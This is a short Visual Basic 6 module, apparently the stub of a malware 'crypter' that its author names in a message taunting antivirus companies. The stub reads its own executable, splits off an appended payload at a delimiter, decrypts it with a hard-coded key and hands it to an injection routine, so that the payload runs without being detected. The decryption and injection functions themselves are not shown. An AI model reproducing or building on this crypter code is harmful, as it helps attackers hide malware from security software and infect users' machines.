Attribute VB_Name = "Module1"
Sub Main()
Dim Data As String
Dim splitted() As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
Data = Space(LOF(1))
Get #1, , Data
Close #1
Debug.Print "Hi AV Companies, this is the Schwarze Sonne Crypter made by Slayer616. Please make a special Detection for me :) "
splitted() = Split(Data, "////")
Injec App.Path + "\" + App.EXEName & ".exe", StrConv(strDemda(splitted(1), "lol"), vbFromUnicode), ""
End Sub
